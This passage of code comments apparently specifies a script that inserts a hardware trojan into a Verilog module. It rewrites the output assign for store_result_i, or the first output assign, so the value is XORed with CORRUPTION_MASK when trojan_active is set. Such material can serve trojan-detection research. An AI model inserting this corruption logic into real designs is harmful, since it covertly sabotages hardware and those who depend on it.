...
//
// IMPORTANT: store_result_i may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If store_result_i is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for store_result_i (or first output assign):
//     assign store_result_i = <expr>;
//   Replace with:
//     assign store_result_i = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
